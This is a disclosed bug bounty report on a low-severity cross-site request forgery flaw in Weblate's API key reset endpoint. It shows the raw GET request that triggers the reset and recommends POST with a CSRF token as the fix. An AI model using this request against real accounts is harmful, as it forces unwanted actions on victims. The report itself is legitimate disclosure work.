# CSRF : Reset API 

## Report Details
- **Report ID**: 223333
- **URL**: https://hackerone.com/reports/223333
- **State**: Closed
- **Severity**: low
- **Submitted**: 2017-04-24T09:20:52.884Z
- **Disclosed**: 2017-05-17T18:03:57.664Z

## Reporter
- **Username**: jaypatel
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: weblate

## Vulnerability Information
**Description :**
Attacker can force to victim for reset his API.

**That HTTP Request :**
```
GET /accounts/reset-api-key/ HTTP/1.1
Host: hosted.weblate.org
Connection: close
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Referer: https://hosted.weblate.org/
Accept-Encoding: gzip, deflate, sdch, br
Accept-Language: en-US,en;q=0.8
Cookie: cookie_here
```
**Fix :**
Make that Request POST , and add a CSRF token there.

Best Regards',
Jay Patel



## Attachments
No attachments
